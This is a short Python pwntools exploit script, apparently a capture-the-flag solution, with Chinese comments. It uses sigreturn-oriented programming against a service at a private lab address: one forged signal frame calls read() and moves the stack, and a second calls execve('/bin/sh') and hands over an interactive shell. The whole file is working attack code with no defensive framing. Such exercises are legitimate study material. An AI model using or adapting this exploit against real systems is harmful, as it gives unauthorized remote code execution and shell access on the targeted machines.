#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

syscall_addr = 0x1000000B
new_rsp_addr = 0x10000058
sigreturn_addr = 0x10000010d

io = remote('172.17.0.3', 10001)

frameRead = SigreturnFrame()			#构造read的SROP栈，使用read读取后续代码到新栈，同时劫持rsp
frameRead.rax = constants.SYS_read
frameRead.rdi = 0
frameRead.rsi = new_rsp_addr
frameRead.rdx = 0x1000
frameRead.rsp = new_rsp_addr
frameRead.rip = syscall_addr

payload = str(frameRead)

io.send(payload)
sleep(3)

frameExecve = SigreturnFrame()			#新栈内容，sigreturn的实现为push 0xf; pop rax; syscall，所以"/bin/sh\x00"放在最后。SROP帧第一个寄存器为uc_flag，不会影响SYS_execve调用
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = new_rsp_addr+len(str(frameRead))
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_addr

payload = str(frameExecve)
payload += "/bin/sh\x00"
io.send(payload)
sleep(3)
io.interactive()


